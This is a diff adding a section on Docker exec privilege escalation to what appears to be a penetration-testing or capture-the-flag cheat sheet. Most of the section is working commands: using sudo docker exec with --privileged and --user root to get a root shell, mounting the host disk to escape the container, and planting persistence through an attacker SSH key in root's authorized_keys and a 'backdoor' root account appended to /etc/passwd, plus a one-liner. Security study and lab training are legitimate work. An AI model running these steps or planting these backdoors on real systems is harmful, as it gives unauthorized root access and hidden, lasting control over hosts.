@@ -1287,6 +1287,71 @@ docker run -it ubuntu bash
 
 * Optional: Run an ubuntu container with docker
 
+### Docker Exec Privilege Escalation
+
+If you can run `sudo docker exec *` on an existing container, use `--privileged` and `--user root` to gain root access and escape to the host.
+
+**Detection:**
+
+```bash
+sudo -l
+# (root) NOPASSWD: /snap/bin/docker exec *
+```
+
+**Find running container ID:**
+
+```bash
+# From process list
+ps -auxww | grep containerd-shim
+# Look for: -id CONTAINER_ID
+
+# Or if you have docker access
+docker ps
+
+# First 12 characters usually sufficient
+echo "e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81" | head -c 12
+# e6ff5b1cbc85
+```
+
+**Exploit - Get root shell in container:**
+
+```bash
+# The key flags are --privileged and --user root
+sudo /snap/bin/docker exec --privileged --user root -it CONTAINER_ID /bin/sh
+
+# Verify root access
+id
+# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)...
+```
+
+**Escape to host filesystem:**
+
+```bash
+# Find host disk
+fdisk -l
+# /dev/sda1 - Linux filesystem
+
+# Mount host disk
+mkdir /tmp/host
+mount /dev/sda1 /tmp/host
+
+# Access host as root
+ls -la /tmp/host/root/
+cat /tmp/host/root/root.txt
+
+# Persistence - add SSH key
+echo "ssh-ed25519 AAAA... attacker@kali" >> /tmp/host/root/.ssh/authorized_keys
+
+# Or modify /etc/passwd on host
+echo "backdoor:$(openssl passwd password123):0:0::/root:/bin/bash" >> /tmp/host/etc/passwd
+```
+
+**One-liner:**
+
+```bash
+sudo docker exec --privileged --user root -it $(docker ps -q | head -1) sh -c 'mkdir /mnt/host; mount /dev/sda1 /mnt/host; cat /mnt/host/root/root.txt'
+```
+
 ### lxd Group Priv Esc
 
 * The best example of how to do this&#x20;
